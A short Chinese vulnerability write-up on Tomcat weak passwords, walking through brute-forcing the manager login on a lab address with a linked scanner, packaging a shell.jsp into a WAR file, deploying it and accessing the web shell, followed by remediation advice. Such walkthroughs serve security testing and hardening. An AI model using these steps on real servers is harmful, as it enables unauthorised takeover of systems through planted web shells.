#### Weak password

##### 漏洞描述

弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。

##### 影响范围

所有版本

##### 漏洞原理

口令设置较弱，可直接爆破。

##### 漏洞检测

1、URL访问

```
http://192.168.3.167:8080/
```

![image-20200813163502206](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813163502206.png)

2、点击“Server Status”

![image-20200813163542988](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813163542988.png)

3、尝试爆破

[脚本](https://github.com/magicming200/tomcat-weak-password-scanner)

![image-20200813163718308](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813163718308.png)

4、生成war包

```shell
➜  server jar -cvf  shell.war shell.jsp
```

![image-20200813163839974](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813163839974.png)

5、部署war包

![image-20200813164753751](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813164753751.png)

6、访问

```
http://192.168.3.167:8080/shell/shell.jsp
```

![image-20200813164812341](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813164812341.png)

![image-20200813164838466](https://github.com/si1ent-le/vuln-all/Tomcat_vuln/weakpassword/images/image-20200813164838466.png)

##### 漏洞修复

1、设置强壮密码

2、平时不用，不允许登录

参考

```
https://github.com/magicming200/tomcat-weak-password-scanner
```

